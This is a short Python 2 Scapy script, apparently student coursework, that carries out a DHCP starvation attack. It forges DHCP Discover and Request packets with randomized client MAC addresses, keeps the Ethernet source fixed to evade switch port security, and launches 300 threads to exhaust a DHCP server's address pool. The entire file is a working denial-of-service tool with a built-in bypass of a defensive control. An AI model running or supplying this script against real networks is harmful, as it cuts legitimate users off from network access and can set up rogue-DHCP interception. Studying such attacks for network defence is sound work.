# DHCP Starvation Attack with Anti-Port Security
# 15SIS023D & 15SIS029H
# Thu 13 Oct 2016 09:21:15 PM UTC

from thread import *
from scapy.all import *
from random import shuffle, randint
from datetime import datetime

conf.checkIPaddr = False						# SOMEONE TELL ME WTF THIS DOES IDEK???
									# BUT 3 DAYS WERE WASTED WITHOUT IT

def starvation():
	# Designer DHCP Discover Packet Crafting

	x = RandMAC()							# Randomize MAC Address
	random.seed(datetime.now())
	y = randint(0,10000)						# Randomize transaction ID (xid)
	hw = get_if_raw_hwaddr(conf.iface)				# Your real MAC Address, if required
	ether = Ether(dst="ff:ff:ff:ff:ff:ff")				# Layer 2 Physical Address, src must be fixed to evade portsec
	ip = IP(src="0.0.0.0",dst="255.255.255.255")			# Layer 3 IP Address
	udp = UDP(sport = 68, dport=67)					# Layer 3 UDP Source & Destination
	bootp = BOOTP(xid = y,chaddr =str(x))				# Bootstrap Protocol, legacy requirement of DHCP. MAC is randomized here.
	dhcp = DHCP(options=[("message-type","discover"),"end"])
	packet = ether/ip/udp/bootp/dhcp				# Layering the packet variable
	ans,unans = srp(packet,inter=0.5,retry=-2,timeout = 0)		# Send and receive replies


	# Retrieving replies

	print "IP address offered: "+str(ans[0][1][BOOTP].yiaddr)
	off_ip = ans[0][1][BOOTP].yiaddr


	# Construct DHCP request

	dhcp = DHCP(options=[("message-type","request"),("requested_addr",str(off_ip)),"end"])
	packet = ether/ip/udp/bootp/dhcp				# Layering the packet variable
	ans,unans = srp(packet,inter=0.5,retry=-2,timeout = 0)		# Execute
	



# The complete Discover - Offer - Request - Acknowledge process is multithreaded to increase starvation rate
# Multi-threading is not elegantly implemented, but it works for a dirty script

x = 0
while x < 300:
	try:
		thread.start_new_thread(starvation,())
		x = x + 1
	except:
		print "Error: Unable to start new thread"

while 1:
	pass
